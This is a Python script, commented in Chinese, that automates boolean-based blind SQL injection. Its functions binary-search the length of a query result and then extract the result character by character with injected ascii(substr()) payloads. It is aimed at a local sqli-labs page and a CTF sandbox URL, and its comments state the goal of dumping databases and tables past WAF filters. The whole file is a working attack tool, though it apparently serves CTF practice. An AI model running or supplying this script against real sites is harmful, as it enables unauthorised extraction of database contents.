import requests
# 4.1：已完成一部分，写这些代码是想面对如果有些函数或者有过滤的情况下可以使用这些代码来进行暴库、表等操作
# 其中该代码中 (f'{url}and length(({sql}))={mid} -- -' 这部分还需要优化，因为有些题目的过滤函数方式是不一样的。需要写一个可以应对多种过滤waf的代码。


# 获取长度
def get_len(sql, l=1, r=10):
    while(l <= r):
        mid = l + r >> 1
        if(key) in requests.get(f"{url} and length(({sql}))={mid} -- -").text:
            return mid
        elif(key) in requests.get(f"{url} and length(({sql}))<{mid} -- -").text:
            r = mid - 1
        else:
            l = mid + 1
    return get_len(sql, l, r*10)


# 获取数据  ，传递一个要查询的sql语句
def get_data(sql, length):
    result = ''
    for i in range(1, length+1):
        l = 32
        r = 128
        while(l <= r):
            mid = l + r >> 1
            if key in requests.get(f"{url} and ascii(substr(({sql}),{i},1))={mid} -- -").text:
                result += chr(mid)
                print(result)
                break
            elif key in requests.get(f"{url} and ascii(substr(({sql}),{i},1))<{mid} -- -").text:
                r = mid - 1
            else:
                l = mid + 1
    return result


# 布尔盲注关键词 如 ： success login 等
key = 'You'
# url+加上参数
# http://challenge-6d52951a55202010.sandbox.ctfhub.com:10800/?id=1
url = "http://localhost/sql/Less-8/?id=2'"
# sql语句 如
# select group_concat(flag) from sqli.flag
sql_database = 'select group_concat(table_name) from information_schema.tables where table_schema=\'security\''
print("开始注入-----")
print(get_data(sql_database, get_len(sql_database)))
